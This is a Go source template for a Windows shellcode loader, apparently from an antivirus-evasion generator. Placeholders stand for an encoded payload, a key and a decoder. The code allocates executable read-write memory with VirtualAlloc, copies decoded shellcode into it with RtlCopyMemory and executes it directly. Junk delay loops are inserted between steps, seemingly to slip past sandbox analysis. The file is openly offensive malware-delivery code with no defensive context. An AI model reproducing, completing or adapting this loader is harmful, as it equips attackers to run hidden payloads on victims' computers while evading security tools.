package main

import (
	"encoding/hex"
	"syscall"
	"time"
	"unsafe"
)
var $keyName []byte
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

$method$


func $genEXE(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	$gd()
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	$gd()
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func $gd() int {
	dd := time.Now().UTC().Day()
	time.Sleep(time.Duration(1) * time.Second)
	var num = 1
	var nn = 1
        for num <= dd {
            num++
        }
                for nn <= num {
                   nn=num+nn
                }
	return dd + time.Now().Second()

}



func main() {
	$bbdata := "$bdata"
	$keyName = []byte("$keys")
	$gd()
	$shellCodeHex := $getDeCode($bbdata)
	$gd()
	$genEXE($shellCodeHex)
}
